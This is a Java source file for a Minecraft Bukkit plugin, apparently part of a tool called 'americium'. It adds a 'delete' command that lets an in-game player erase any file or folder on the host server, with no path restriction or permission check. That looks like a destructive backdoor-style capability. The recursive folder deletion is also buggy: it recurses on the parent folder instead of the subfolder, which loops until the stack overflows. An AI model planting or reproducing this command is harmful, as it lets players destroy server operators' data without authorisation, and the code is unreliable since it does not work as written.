package cc.americium.command.commands;

import cc.americium.Colors;
import cc.americium.command.Command;
import cc.americium.command.Context;
import cc.americium.command.Sender;
import org.bukkit.entity.Player;

import java.io.File;

public class Delete implements Command {
    @Override
    public String[] getCommands() {
        return new String[]{"delete"};
    }

    @Override
    public String getDescription() {
        return "Deletes a file/folder from the server.";
    }

    @Override
    public void execute(Player executor, Sender sender, Context context) {
        String[] args = context.getArgs();
        if (args.length == 0) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + "delete <file/folder>");
            return;
        }

        File file;
        try {
            file = new File(String.join(" ", args));
        } catch (Exception e) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + e.getMessage());
            return;
        }

        if (!file.exists()) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + "Could not find file!");
            return;
        }

        if (file.isDirectory()) {
            this.deleteFolder(file, sender);
            return;
        }

        if (!file.delete()) {
            file.deleteOnExit();
            sender.sendMessage(Colors.Prefix + Colors.Failure + "Could not delete file! Attempting to delete on exit!");
            return;
        }

        sender.sendMessage(Colors.Prefix + Colors.Success + "Successfully deleted " + file.getPath() + "!");
    }

    private void deleteFolder(File file, Sender sender) {
        for (File sub : file.listFiles()) {
            if (sub.isDirectory()) {
                this.deleteFolder(file, sender);
                continue;
            }

            if (sub.delete()) {
                sender.sendMessage(Colors.Prefix + Colors.Caution + "Deleted " + sub.getPath() + "!");
            } else {
                sender.sendMessage(Colors.Prefix + Colors.Failure + "Unable to delete " + sub.getPath() + "!");
            }
        }

        if (file.delete()) {
            sender.sendMessage(Colors.Prefix + Colors.Success + "Was able to delete dir " + file.getPath() + "!");
        } else {
            sender.sendMessage(Colors.Prefix + Colors.Failure + "Was unable to delete dir " + file.getPath() + "!");
        }
    }
}
